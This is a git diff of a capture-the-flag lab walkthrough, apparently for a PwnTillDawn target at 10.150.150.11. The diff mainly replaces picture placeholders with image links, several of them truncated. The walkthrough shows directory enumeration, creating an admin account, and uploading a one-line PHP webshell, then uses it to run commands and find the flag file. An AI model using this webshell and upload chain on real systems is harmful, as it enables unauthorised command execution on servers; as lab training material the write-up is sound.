@@ -10,7 +10,7 @@ Note this for:<br/>
 21 → FTP (file transfer)
 22 → SSH (remote login)
 445 → SMB (Windows file sharing)
-(Picture here)
+![img alt](https://github.com/MeerTrayed/Pwntilldawn-Lab3/blob/fdce028dfbcf331ed5677020d69270c1c3c50a15/1.png)
 
 Doing 10.150.150.11 <br/>
 Has 
@@ -22,47 +22,47 @@ Has
 | microsoft-ds  | Close  | <br/>
 
  2.`gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak`
- (Picture here)
- (Picture here)
+ ![img alt](
+ ![img alt](
 
 Has several HTTP links we can try to access<br>
 
  3. i. /Admin
-    (Admin Picture)
+    ![img alt](
 
    ii. /upload
-   (Upload Picture)
+   ![img alt](
 
 4. Inside http://10.150.150.11, there's a decent directory to get into, which is the addedituser.php
    Create a user with an admin role
 
   Extra: Access to admin account using simple tricks (Inspect Q). change type=password into type=text
-  (Picture)
+  ![img alt](
 
 5. Create a simple webshell to run commands through the browser.
    `<?php system($_GET['cmd']); ?>` save it as "shell.php"
    Afterward, upload it into your accounts.
-   (Picture)
+   ![img alt](
 
 7. Force uploading the files into the new folder of http://10.150.150.11/upload/12
    Reason to run the PHP file on the web.
    http://10.150.150.11/upload/12/shell.php
    http://10.150.150.11/upload/12/shell.php?cmd=hostname
-   (Picture)
+   ![img alt](
    
    http://10.150.150.11/upload/12/shell.php?cmd=whoami
-   (Picture)
+   ![img alt](
 
 # Because we know it's a window
   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users
-   (Picture)
+   ![img alt](
 
    http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop
-   (Picture)
+   ![img alt](
 
    There it is. The flag file
    http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop\FLAG1.txt
-   (Picture)
+   ![img alt](
 
  
  
